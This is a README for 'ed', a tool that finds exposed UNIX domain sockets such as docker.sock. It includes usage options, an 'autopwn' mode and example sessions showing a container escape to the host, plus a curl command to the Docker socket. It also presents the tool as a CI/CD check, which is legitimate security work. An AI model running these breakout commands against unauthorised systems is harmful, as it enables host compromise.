# ed
Ed is a tool used to identify and exploit accessible UNIX Domain Sockets

# What does it do?
Ed is a binary to help you find and exploit accessible UNIX domain sockets on a container or host. This is useful for example, hunting Docker.sock when it has been mounted to a non-default location and or not mounted with the default name i.e  "/var/run/Docker.sock". 

# Why ed?
Finding exposed UNIX domain sockets, especially Docker.sock, is very useful ;) Ed can be useful in a DevOps process to ensure that containers do not have any unnecessarily exposed sockets or it can be used to exploit exposed sockets to achieve container breakout. Additionally, Ed can be used in a CI/CD pipeline.

# Usage
Ed can be used to look for plain 'ol UNIX domain sockets, UNIX domain sockets that respond to HTTP requests or UNIX domain sockets that behave like Docker.sock. Ed by default searches from the CWD. To use Ed, get the binary on the host and use the following options:

 ```
  ./ed -h
[+] Hunt 'dem Socks
Usage of ./ed:
    -autopwn
        Attempt to autopwn exposed sockets
  -cicd
        Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
  -docker
        Hunt for docker.sock
  -http
        Hunt for Available UNIX Domain Sockets with HTTP
  -interfaces
        Display available network interfaces
  -json
        Return output in JSON format
  -path string
        Path to Start Scanning for UNIX Domain Sockets (default ".")
  -socket
        Hunt for Available UNIX Domain Sockets (default true)
  -verbose
        Verbose output

```

Example: Autopwn exposed Docker UNIX Domain Socket

```
root@2ae7f389d44c:/app# ./ed -path=/ -autopwn=true
[+] Hunt 'dem Socks
[+] Hunting Down UNIX Domain Sockets from: /
[*] Valid Socket: /tmp/docker.mock
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to Autopwn:  /tmp/docker.mock
[*] Getting Docker client...
[*] Successfully got Docker client...
[+] Attempting to escape to host...
You are now on the underlying host
/ # 
/ # exit
[*] Successfully exited TTY
[+] Finished
```

 Example: Look for exposed Docker.sock
 
 ```
 root@2ae7f389d44c:/app# ./ed -path=/    
[+] Hunt 'dem Socks
[+] Hunting Down UNIX Domain Sockets from: /
[*] Valid Socket: /run/docker.sock
 
 ```
 
 Example: Look for exposed Docker.sock, attempt to pwn it and return an exit code of 1 for your CI\CD test
 
 ```
 root@2ae7f389d44c:/app# ./ed_linux_amd64 -path=/ -cicd=true -autopwn=true
[+] Hunt 'dem Socks
[+] Hunting Down UNIX Domain Sockets from: /
[*] Valid Socket: /run/docker.sock
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to Autopwn:  /run/docker.sock
[*] Getting Docker client...
[*] Successfully got Docker client...
[+] Attempting to escape to host...
[+] Attempting in CICD Mode
[+] Finished
root@d20b953fc52f:/app# echo $?
1
 
 ```
 
 And now that you have found an exposed Docker socket, you could go ahead and issue commands to the Docker daemon using CURL or just issue the -autopwn fag;):
 
 ```
 root@70a7cf3d4f93:/app# curl --unix-socket  /var/run/docker.sock http:/docker/info
 ..l00t
 ```
 
 # Testing
Ed can be tested with Docker, WARNING, mouting Docker.sock into containers is a very bad idea but if you want to test Ed, you can with the following:

```
docker-compose build && docker-compose up
...
worker_1_fd52bdee04ce | [+] Hunt 'dem Socks
worker_1_fd52bdee04ce | [+] Hunting Down UNIX Domain Sockets from: /
worker_1_fd52bdee04ce | [*] Valid Socket: /run/docker.sock
ed_worker_1_fd52bdee04ce exited with code 0

```

# Demo

[![asciicast](https://asciinema.org/a/oUkKmXvOGrT9QVbw8iQlbUxpA.png)](https://asciinema.org/a/oUkKmXvOGrT9QVbw8iQlbUxpA)
 
 # License
 Ed is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).
